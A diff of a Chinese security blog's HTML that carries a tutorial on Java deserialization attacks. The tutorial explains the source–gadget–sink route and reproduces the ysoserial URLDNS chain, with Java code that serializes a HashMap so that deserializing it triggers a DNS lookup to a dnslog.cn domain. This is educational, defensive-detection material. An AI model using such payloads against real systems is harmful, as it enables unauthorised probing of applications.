+<h4 id="ru-kou-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-wei-xian-fang-fa-readobject-shi-diao-yong"><a href="#入口参数中包含可控类，该类有危险方法，-readObject-时调用" class="headerlink" title="入口参数中包含可控类，该类有危险方法， readObject 时调用"></a>入口参数中包含可控类，该类有危险方法， <code>readObject</code> 时调用<a href="#ru-kou-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-wei-xian-fang-fa-readobject-shi-diao-yong" class="header-anchor">#</a></h4><h4 id="ru-kou-lei-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-diao-yong-qi-ta-you-wei-xian-fang-fa-de-lei-readobject-shi-diao-yong"><a href="#入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a>入口类参数中包含可控类，该类又调用其他有危险方法的类，<code>readObject</code> 时调用<a href="#ru-kou-lei-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-diao-yong-qi-ta-you-wei-xian-fang-fa-de-lei-readobject-shi-diao-yong" class="header-anchor">#</a></h4><h4 id="gou-zao-han-shu-x2f-jing-tai-dai-ma-kuai-deng-lei-jia-zai-shi-yin-shi-zhi-xing"><a href="#构造函数-x2F-静态代码块等类加载时隐式执行" class="headerlink" title="构造函数&#x2F;静态代码块等类加载时隐式执行"></a>构造函数&#x2F;静态代码块等类加载时隐式执行<a href="#gou-zao-han-shu-x2f-jing-tai-dai-ma-kuai-deng-lei-jia-zai-shi-yin-shi-zhi-xing" class="header-anchor">#</a></h4><h3 id="chan-sheng-lou-dong-de-gong-ji-lu-xian"><a href="#产生漏洞的攻击路线" class="headerlink" title="产生漏洞的攻击路线"></a>产生漏洞的攻击路线<a href="#chan-sheng-lou-dong-de-gong-ji-lu-xian" class="header-anchor">#</a></h3><ul>
 <li><p>首先攻击的前提是继承了 <code>Serializable</code> 接口</p>
 </li>
 <li><p>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p>
 </li>
-<li>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</li>
-<li>执行类 sink（RCE SSRF 写文件等等） 比如 <code>exec</code> 这种函数</li>
+<li><p>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p>
+</li>
+<li><p>执行类 sink（RCE SSRF 写文件等等） 比如 <code>exec</code> 这种函数</p>
+</li>
 </ul>
 <h3 id="shi-zhan-urldns-shi-yong-java-fan-xu-lie-hua-fa-qi-yi-ge-dns-qing-qiu"><a href="#实战——-URLDNS-使用-Java-反序列化发起一个-DNS-请求" class="headerlink" title="实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求"></a>实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求<a href="#shi-zhan-urldns-shi-yong-java-fan-xu-lie-hua-fa-qi-yi-ge-dns-qing-qiu" class="header-anchor">#</a></h3><ul>
 <li>出发点：URLDNS 在 JAVA 复杂的反序列化漏洞中足够简单；URLDNS 就是 ysoserial 中一个利用链的名字，虽然准确来说这个不能称作 “利用链”。因为其参数不是一个可以利用的命令，而仅为一个 URL，其能触发的结果也不是命令执行，而是一次 DNS 请求。</li>
 <li>虽然这个利用链实际上不能利用，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用。如 使用 Java 内置的类构造，对第三方库没有依赖。在目标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类。</li>
 </ul>
 <p>我们先去到 ysoserial 的项目当中，去看看它是如何构造 URLDNS 链的。</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial/URLDNS.java at master · frohoff/ysoserial (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)</a></p>
 <p>更详细的信息在：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></p>
-<p><img src="/images/JAVA反序列化00/ysoserial.png" alt="img"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9600/ysoserial.png" alt="img"></p>
 <p>现在开始正式复现 URLDNS 利用链！</p>
 <h4 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h4><p>Java URL 类在其 <code>equals</code> 和 <code>hashCode</code> 方法中有一个有趣的性质，那就是在调用这两个方法时 URL 类会发起一个 DNS 查询请求（准确地说在这两个方法中有一个比较操作，在这个比较操作期间会触发 dns 查询 ）。根据 javadocs，两个 hosts 被认为是等价的，如果这两个 hosts 的主机名被解析为同一个 IP 地址。</p>
 <p>所以，如果我们能得到一个 在URL 对象上调用 <code>equals</code> 或 <code>hashCode</code> 方法的 gadget，那么我们就可以发起一个 DNS 查询。我们可以通过追踪这个 DNS 查询来验证反序列化是否发生以及在我们控制下的代码是否被执行。常见的 DNS 追踪工具有 DNSChef、Burp Collaborator、<a target="_blank" rel="noopener" href="http://dnslog.cn/">DNSLOG</a> 等</p>
 <h4 id="fan-xu-lie-hua-guo-cheng-zhong-shi-ru-he-fa-qi-dns-cha-xun-qing-qiu-de"><a href="#反序列化过程中是如何发起-DNS-查询请求的？" class="headerlink" title="反序列化过程中是如何发起 DNS 查询请求的？"></a>反序列化过程中是如何发起 DNS 查询请求的？<a href="#fan-xu-lie-hua-guo-cheng-zhong-shi-ru-he-fa-qi-dns-cha-xun-qing-qiu-de" class="header-anchor">#</a></h4><p>在 HashMap 的 <code>readObject</code> 方法中，其通过读取 HashMap 的结构状态开始，然后对其包含的所有项进行一个循环。在循环过程中，该方法会从流中读取 key 和 value。然后 HashMap 会以 key 的哈希值、key、value 为参数调用 <code>putVal</code> 方法。</p>
-<p><img src="/images/JAVA反序列化01/image-20230107165219513.png" alt="image-20230107165219513"></p>
-<p><img src="/images/JAVA反序列化01/image-20230107165412584.png" alt="image-20230107165412584"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107165219513.png" alt="image-20230107165219513"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107165412584.png" alt="image-20230107165412584"></p>
 <p>这就是我们所需要的东西，我们有一个调用了 <code>readObject</code> 方法的对象，同时这个 <code>readObject</code> 方法将会在一个我们提供的对象（可控）上调用 hashCode方法。实际上，对于 hashCode 方法的调用发生在 <code>HashMap.hash function</code> 内部。继续跟进上图的 hash 方法，该方法内部调用了 <code>key.hashCode()</code> 方法</p>
-<p><img src="/images/JAVA反序列化01/image-20230108201359461.png" alt="image-20230108201359461"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201359461.png" alt="image-20230108201359461"></p>
 <p>通过提供一个 Java URL 对象 作为 HashMap 的 Key，我们将在反序列化过程中发起一个 DNS lookup。此时 key 是一个 Java URL 对象，那么 <code>key.hashCode</code> 就是调用 URl 对象的 <code>hashCode()</code> 方法，我们定义一个URL对象然后看看这个方法。</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL url <span class="operator">=</span> new URL(<span class="string">&quot;http://san59s.dnslog.cn&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/images/JAVA反序列化01/image-20230108201644434.png" alt="image-20230108201644434"></p>
+<pre class="line-numbers language-none"><code class="language-none">URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;san59s.dnslog.cn&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201644434.png" alt="image-20230108201644434"></p>
 <p>发现这个方法内部会调用 <code>handler.hashCode()</code> 方法，而 <code>handler</code> 是一个 <code>URLStreamHandler</code> 对象</p>
-<p><img src="/images/JAVA反序列化01/image-20230108201743639.png" alt="image-20230108201743639"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201743639.png" alt="image-20230108201743639"></p>
 <p>所以我们看看这个 <code>URLStreamHandler</code> 类的 hashCode() 方法</p>
-<p><img src="/images/JAVA反序列化01/image-20230108201846973.png" alt="image-20230108201846973"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201846973.png" alt="image-20230108201846973"></p>
 <p><code>URLStreamHandler</code> 类的 hashCode() 方法比较长，但是我们只需要关注关键函数即可，上图中圈起来的 <code>getHostAddress()</code> 方法就是我们想要的，跟进到这个方法内部如下：</p>
-<p><img src="/images/JAVA反序列化01/image-20230108201952783.png" alt="image-20230108201952783"> </p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108201952783.png" alt="image-20230108201952783"> </p>
 <p>可以发现最后调用的是一个 URL 类的 <code>getHostAddress()</code> 方法，而这个方法会发起一个 DNS 查询。看到这相信我们就明白这个 URLDNS 链是如何触发一个DNS 查询请求的了，调用链整体并不长，可以归纳调用链如下：</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">HashMap</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">HashMap</span>.</span></span>put<span class="constructor">Val()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">HashMap</span>.</span></span>hash<span class="literal">()</span></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">URL</span>.</span></span>hash<span class="constructor">Code()</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Gadget Chain:
+    HashMap.readObject()
+        HashMap.putVal()
+            HashMap.hash()
+                URL.hashCode()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h4 id="zhu-yi-shi-xiang"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项<a href="#zhu-yi-shi-xiang" class="header-anchor">#</a></h4><p>当 URL 对象刚开始放置在一个 HashMap 中时，通过调用 <code>put</code> 方法，<code>HashMap.hash</code> 方法将会被调用。这个方法实际上会调用 URl 对象的 hashCode 方法</p>
-<p><img src="/images/JAVA反序列化01/image-20230107171339409.png" alt="image-20230107171339409"></p>
-<p><img src="/images/JAVA反序列化01/image-20230107171319093.png" alt="image-20230107171319093"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107171339409.png" alt="image-20230107171339409"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230107171319093.png" alt="image-20230107171319093"></p>
 <p>我们传入的 key 是一个 URL 类的对象，所以调用的实际上是 URL 类的 <code>hashCode()</code> 方法</p>
-<p><img src="/images/JAVA反序列化01/image-20230108173643417.png" alt="image-20230108173643417"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108173643417.png" alt="image-20230108173643417"></p>
 <p>从上图可以看到如果 <code>hashCode</code> 不等于 -1，直接返回 hashCode 变量。那这就会有一个问题，那就是我们传入的 URL 对象其 hashCode 默认值是等于 -1 的。其将 hashCode 值存储在一个不是 transient 的实例变量中，如下图</p>
-<p><img src="/images/JAVA反序列化01/image-20230108183625288.png" alt="image-20230108183625288"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108183625288.png" alt="image-20230108183625288"></p>
 <p>所以在这里会直接调用 <code>handler.hashCode()</code> 方法，如下图</p>
-<p><img src="/images/JAVA反序列化01/image-20230108183730720.png" alt="image-20230108183730720"></p>
+<p><img src="/images/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/image-20230108183730720.png" alt="image-20230108183730720"></p>
 <p>那这样就会发起一个 DNS 查询请求，也就是说我们在序列化之前就已经发起了一个 DNS 查询请求，这就会和我们反序列化时发起的 DNS 请求弄混，所以我们要避免这种情况。那很自然的思路就是将以上的 URL 类对象的 <code>hashCode</code> 改成不是 -1 ，这样就会在调用 hashCode() 方法时直接返回，而不是发起一个 DNS 查询请求。那如何做到这一点呢？没错就是通过<strong>反射</strong>！</p>
 <p>我们可以通过反射将 URL 类对象的 hashCode 属性值改为不等于-1，然后调用 HashMap 的 put 方法放入 这个 URL 类对象。之后再通过反射将 URL 类对象的 hashCode 属性值再改回 -1 ，然后进行序列化即可。最后当我们进行反序列化时，根据前面的分析，此时就会调用 HashMap 类的 <code>readObject</code> 方法并发起一个 DNS 查询请求。</p>
 <p>以下是代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://san59s.dnslog.cn&quot;</span>);</span><br><span class="line">        Class c= url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">public class SerializationTest &#123;
+    public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+
+    public static void main(String[] args) throws Exception&#123;
+        HashMap&lt;URL,Integer&gt; hashmap &#x3D; new HashMap&lt;URL,Integer&gt;();
+        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;san59s.dnslog.cn&quot;);
+        Class c&#x3D; url.getClass();
+        Field hashcodefield &#x3D; c.getDeclaredField(&quot;hashCode&quot;);
+        hashcodefield.setAccessible(true);
+        hashcodefield.set(url,1234);
+        hashmap.put(url,1);
+
+        hashcodefield.set(url,-1);
+
+        serialize(hashmap);
+
+
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>代码中有一个有趣的地方，那就是将 URL 类对象 url 的 hashCode 改回 -1 时是直接调用前面得到的 Field 对象实例来进行的，而不是通过 HashMap 的实例对象 hashmap。根据直觉，我们都已经通过 hashmap 的 put 方法将 url 放入进去，那么再修改 url 的值似乎不应该影响到 hashmap。。</p>
 <h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mocas_wang/article/details/107621010">CSDN</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-serialization.html">菜鸟教程</a></p>
 <p><a target="_blank" rel="noopener" href="https://drun1baby.github.io/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#toc-heading-14">芜风师傅</a></p>
 
-  </div>
-</article>
+                
+            </div>
+            <hr/>
 
+            
 
-
+    <div class="reprint" id="reprint-statement">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li>
-         
-          <li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-         
-          <li><a href="/tags/">标签</a></li>
-         
-          <li><a href="/categories/">分类</a></li>
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">MirRoR4s</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://MirRoR4s.github.io/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html">https://MirRoR4s.github.io/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">MirRoR4s</a>
+                    !
+                </span>
+            </div>
         
-      </ul>
     </div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ding-yi"><span class="toc-number">1.</span> <span class="toc-text">定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shi-me-shi-java-xu-lie-hua-he-fan-xu-lie-hua"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 java 序列化和反序列化？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gong-neng-he-yong-chu"><span class="toc-number">2.</span> <span class="toc-text">功能和用处</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#java-xu-lie-hua-he-fan-xu-lie-hua-you-shi-me-gong-neng-he-yong-chu"><span class="toc-number">2.1.</span> <span class="toc-text">java 序列化和反序列化有什么功能和用处？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shi-me-shi-hou-hui-yong-dao-java-xu-lie-hua-he-fan-xu-lie-hua"><span class="toc-number">2.2.</span> <span class="toc-text">什么时候会用到 Java 序列化和反序列化？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ru-he-jin-xing-java-xu-lie-hua-he-fan-xu-lie-hua"><span class="toc-number">3.</span> <span class="toc-text">如何进行 Java 序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xu-lie-hua-dui-xiang"><span class="toc-number">3.1.</span> <span class="toc-text">序列化对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#yong-dao-de-fu-zhu-lei"><span class="toc-number">3.1.1.</span> <span class="toc-text">用到的辅助类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fan-xu-lie-hua-dui-xiang"><span class="toc-number">3.2.</span> <span class="toc-text">反序列化对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#yong-dao-de-fu-zhu-lei"><span class="toc-number">3.2.1.</span> <span class="toc-text">用到的辅助类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xu-lie-hua-dai-ma-shi-li"><span class="toc-number">3.2.2.</span> <span class="toc-text">序列化代码示例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fan-xu-lie-hua-dai-ma-shi-li"><span class="toc-number">3.2.3.</span> <span class="toc-text">反序列化代码示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xu-lie-hua-guo-cheng-zhong-de-zhu-yi-shi-xiang"><span class="toc-number">4.</span> <span class="toc-text">序列化过程中的注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wei-shi-me-hui-chan-sheng-xu-lie-hua-de-an-quan-wen-ti"><span class="toc-number">5.</span> <span class="toc-text">为什么会产生序列化的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fu-wu-duan-fan-xu-lie-hua-zi-dong-zhi-xing-readobject-fang-fa"><span class="toc-number">5.1.</span> <span class="toc-text">服务端反序列化自动执行 readObject 方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ke-neng-cun-zai-an-quan-lou-dong-de-xing-shi"><span class="toc-number">5.2.</span> <span class="toc-text">可能存在安全漏洞的形式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ru-kou-lei-de-readobject-zhi-jie-diao-yong-wei-xian-fang-fa"><span class="toc-number">5.2.1.</span> <span class="toc-text">入口类的 readObject 直接调用危险方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ru-kou-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-wei-xian-fang-fa-readobject-shi-diao-yong"><span class="toc-number">5.3.</span> <span class="toc-text">入口参数中包含可控类，该类有危险方法， readObject 时调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ru-kou-lei-can-shu-zhong-bao-han-ke-kong-lei-gai-lei-you-diao-yong-qi-ta-you-wei-xian-fang-fa-de-lei-readobject-shi-diao-yong"><span class="toc-number">5.4.</span> <span class="toc-text">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gou-zao-han-shu-jing-tai-dai-ma-kuai-deng-lei-jia-zai-shi-yin-shi-zhi-xing"><span class="toc-number">5.5.</span> <span class="toc-text">构造函数&#x2F;静态代码块等类加载时隐式执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chan-sheng-lou-dong-de-gong-ji-lu-xian"><span class="toc-number">6.</span> <span class="toc-text">产生漏洞的攻击路线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shi-zhan-urldns-shi-yong-java-fan-xu-lie-hua-fa-qi-yi-ge-dns-qing-qiu"><span class="toc-number">7.</span> <span class="toc-text">实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qian-yan"><span class="toc-number">7.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fan-xu-lie-hua-guo-cheng-zhong-shi-ru-he-fa-qi-dns-cha-xun-qing-qiu-de"><span class="toc-number">7.2.</span> <span class="toc-text">反序列化过程中是如何发起 DNS 查询请求的？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zhu-yi-shi-xiang"><span class="toc-number">7.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">8.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
 
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&text=JAVA反序列化01-URLDNS链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&is_video=false&description=JAVA反序列化01-URLDNS链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=JAVA反序列化01-URLDNS链&body=Check out this article: https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&title=JAVA反序列化01-URLDNS链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&name=JAVA反序列化01-URLDNS链&description=&lt;!--toc--&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9601/index.html&t=JAVA反序列化01-URLDNS链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
 
-    </div>
 
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
